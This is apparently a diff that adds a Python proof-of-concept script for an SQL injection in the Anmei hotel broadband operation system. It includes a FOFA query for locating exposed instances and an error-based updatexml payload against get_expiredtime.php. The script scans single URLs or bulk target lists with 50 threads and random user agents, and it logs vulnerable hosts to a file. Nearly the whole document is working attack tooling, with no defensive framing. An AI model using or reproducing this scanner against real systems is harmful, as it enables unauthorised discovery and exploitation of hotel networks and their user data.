@@ -1,0 +1,79 @@
+# 安美数字酒店宽带运营系统SQL注入
+# fofa:title="酒店宽带运营系统"
+
+# poc = """
+# GET /user/portal/get_expiredtime.php?uid=1\%27%20and%20updatexml(1,concat(0x7e,(md5(1))),3)--%20q HTTP/1.1
+# Host: 
+# User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+# """
+
+import argparse,sys,requests,random
+from multiprocessing.dummy import Pool
+from urllib3.exceptions import InsecureRequestWarning
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+]
+# 禁用 SSL 警告
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+def banner():
+    pass
+
+def poc(target):
+    user_agent = random.choice(user_agents)
+    payload = '/user/portal/get_expiredtime.php?uid=1\%27%20and%20updatexml(1,concat(0x7e,(md5(1))),3)--%20q'
+    # 探测存活
+    headers = {
+    "User-Agent": user_agent
+}
+    try:
+        res1 = requests.get(url=target,headers=headers,timeout=5,verify=False)
+        if res1.status_code == 200:
+            res2 = requests.get(url=target+payload,headers=headers,timeout=5,verify=False)
+            if "c4ca4238a0b923820dcc509a6f75849" in res2.text:
+                print(f"[+]{target}存在漏洞")
+                with open('result.txt','a',encoding='utf-8') as f:
+                    f.write(target+'\n')
+            else:
+                print(f"[-]{target}不存在漏洞")
+        else:
+            print(f"[*]{target}访问出现问题，请手工测试")
+    except:
+        print(f"[-]{target}请求错误")
+
+def main():
+    # 定义
+    parse = argparse.ArgumentParser(description="安美数字酒店宽带运营系统SQL注入")
+
+    # 添加命令行参数
+    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
+    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")
+
+    # 实例化
+    args = parse.parse_args()
+
+    # 对用户的输入做判断 输入的url还是file
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as f:
+            for url in f.readlines():
+                url_list.append(url.strip())
+        # 开启多线程
+        print(f"[*] 已加载 {len(url_list)} 个URL进行测试")
+        mp = Pool(50) # 定义线程池的大小
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+        print("[*] 所有URL测试完成")
+    else:
+        print(f"Usage:python {sys.argv[0]} -h")
+
+# 定义函数的入口
+if __name__ == '__main__':
+    main()
